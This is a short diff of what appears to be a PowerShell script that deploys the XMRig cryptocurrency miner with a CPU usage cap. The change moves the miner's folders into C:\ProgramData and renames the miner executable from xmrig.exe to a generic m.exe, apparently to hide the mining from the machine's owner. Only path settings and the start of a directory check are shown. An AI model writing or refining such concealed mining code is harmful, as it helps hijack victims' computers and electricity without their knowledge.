@@ -5,10 +5,10 @@ $TEMP_DIR = "$env:TEMP\worker_env"
 $WORKER = $false
 $CPU_LIMIT = 70
 
-$BASE_DIR = "C:\soft"
-$TEMP_DIR = "C:\soft\temp"
-$M =   "C:\soft\temp\m"
-$MINER_EXE = "$TEMP_DIR\m\xmrig-6.25.0\xmrig.exe"
+$BASE_DIR = "C:\ProgramData\soft"
+$TEMP_DIR = "C:\ProgramData\soft\temp"
+$M =   "C:\ProgramData\soft\temp\m"
+$MINER_EXE = "$TEMP_DIR\m\m\m.exe"
 
         # Ensure base directory exists
         if (!(Test-Path $BASE_DIR)) {
